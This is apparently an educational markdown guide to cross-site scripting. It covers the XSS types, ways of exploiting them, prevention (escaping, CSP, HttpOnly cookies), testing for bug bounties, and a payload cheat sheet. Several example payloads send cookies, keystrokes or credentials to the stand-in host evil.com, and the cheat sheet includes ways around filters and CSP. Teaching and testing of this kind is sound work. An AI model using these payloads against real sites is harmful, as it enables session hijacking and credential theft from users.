# Web-App-Vulns-Explained


### **📄 XSS Explanation in Markdown File**
#### **`xss_explained.md`**
````markdown
# 🔥 Cross-Site Scripting (XSS) – A Deep Dive

## 🎯 What is XSS?
**Cross-Site Scripting (XSS)** is a **client-side** web security vulnerability that allows an attacker to inject **malicious JavaScript** into a website, which then gets executed in a victim's browser. This can lead to:
- **Session hijacking**
- **Phishing attacks**
- **Data theft**
- **Account takeover**

---

## 🔥 Types of XSS

### 1️⃣ Stored XSS (Persistent)
- The **malicious script is stored** on the website (e.g., in a database).
- It affects **all users** who visit the infected page.
- Common in **comment sections, user profiles, and feedback forms**.

**Example Attack:**
1. An attacker posts the following comment:
   ```html
   <script>fetch('https://evil.com/steal?cookie='+document.cookie)</script>
   ```
2. The script gets **saved in the database**.
3. When other users visit the page, their cookies are **stolen** and sent to `evil.com`.

---

### 2️⃣ Reflected XSS (Non-Persistent)
- The script is **not stored** but **reflected** back in the HTTP response.
- The attack works only when the victim **clicks a malicious link**.

**Example Attack:**
1. The attacker tricks the victim into visiting:
   ```
   https://victim.com/search?q=<script>alert(1)</script>
   ```
2. The server includes the unsanitized input in the response:
   ```html
   <p>Search results for: <script>alert(1)</script></p>
   ```
3. The browser **executes** the JavaScript.

---

### 3️⃣ DOM-Based XSS
- The script is **not injected via HTTP responses** but **executed in the browser**.
- Happens when JavaScript **modifies the DOM** insecurely.

**Example Vulnerable Code:**
```html
<script>
    var search = new URLSearchParams(window.location.search);
    document.write("Search: " + search.get("q")); // ❌ UNSAFE
</script>
```
**Attack URL:**
```
https://victim.com/?q=<script>alert(1)</script>
```
📌 **Impact:** Attacker can **control the DOM** and execute arbitrary JavaScript.

---

## 🚀 How XSS Can Be Exploited

### 1️⃣ Cookie Theft (Session Hijacking)
**Payload:**
```html
<script>document.location='https://evil.com/steal?cookie='+document.cookie</script>
```
📌 **Impact:**  
- Steals **session cookies** → Leads to **account takeover**.

---

### 2️⃣ Keylogging & Credential Theft
**Payload:**
```html
<script>
document.onkeypress = function(e) {
    fetch('https://evil.com/log?key=' + e.key);
};
</script>
```
📌 **Impact:**  
- Captures user keystrokes (passwords, messages, etc.).

---

### 3️⃣ Fake Login Forms (Phishing)
**Payload:**
```html
<script>
document.body.innerHTML = '<form action="https://evil.com" method="POST">'+
'<input name="username" placeholder="Enter username">'+
'<input name="password" type="password" placeholder="Enter password">'+
'<input type="submit"></form>';
</script>
```
📌 **Impact:**  
- Creates a **fake login form** to **steal credentials**.

---

## 🔐 How to Prevent XSS

### ✅ 1. Input Sanitization
- **Escape special characters** (`< > " ' &`) before displaying user input.

**Example (PHP):**
```php
echo htmlspecialchars($user_input, ENT_QUOTES, 'UTF-8');
```

---

### ✅ 2. Content Security Policy (CSP)
- Restrict JavaScript execution to **trusted sources**.

**Example CSP header:**
```
Content-Security-Policy: default-src 'self'; script-src 'self' https://trusted.com;
```

📌 **Prevents** inline scripts & untrusted JavaScript sources.

---

### ✅ 3. Secure JavaScript Handling
- Avoid `document.write()`:
  ```js
  document.write("<script>alert(1)</script>"); // ❌ UNSAFE
  ```
- Instead, use **safe DOM manipulation**:
  ```js
  var node = document.createElement("p");
  node.textContent = userInput; // ✅ SAFE
  document.body.appendChild(node);
  ```

---

### ✅ 4. HTTP-Only Cookies
- Prevent JavaScript from accessing session cookies:
  ```
  Set-Cookie: sessionid=abcd1234; HttpOnly; Secure
  ```

📌 **Mitigates session hijacking** via XSS.

---

## 🕵️ How to Find XSS (Bug Bounty/Pentesting)

### 🔍 Testing for Stored XSS
1. Enter payloads in **input fields (comments, profiles, feedback forms)**:
   ```html
   <script>alert('XSS')</script>
   ```
2. Refresh the page and check if the alert executes.

---

### 🔍 Testing for Reflected XSS
1. Try **URL parameters**:
   ```
   https://victim.com/search?q=<script>alert(1)</script>
   ```
2. Check if the script **reflects** in the response.

---

### 🔍 Testing for DOM-Based XSS
1. Look for JavaScript using `document.write()`, `innerHTML`, `eval()`:
   ```js
   document.write(location.search);
   ```
2. Test payloads:
   ```
   https://victim.com/?q=<script>alert(1)</script>
   ```

---

## 🛠️ XSS Cheat Sheet (Payloads)

🔹 **Basic Payload**
```html
<script>alert(1)</script>
```

🔹 **Bypassing `alert()` filters**
```html
<svg onload=confirm(1)>
```

🔹 **Executing JavaScript via `href`**
```html
<a href="javascript:alert(1)">Click me</a>
```

🔹 **Event-Based XSS**
```html
<img src="x" onerror="alert(1)">
```

🔹 **Bypassing CSP using JSONP**
```html
<script src="https://trusted.com/callback?param=<script>alert(1)</script>"></script>
```

---

## 🎯 Final Takeaways
✅ **XSS is dangerous** because it executes **malicious JavaScript** in the victim’s browser.  
✅ **Stored XSS is the worst** since it affects multiple users.  
✅ **Reflected XSS requires user interaction** (e.g., clicking a link).  
✅ **DOM XSS is harder to detect** but **still very dangerous**.  
✅ **Proper sanitization, escaping, and CSP policies** can prevent XSS.  

---

🔎 **Want to test XSS in a lab?** I can help you set up a test environment! 🚀
````

---
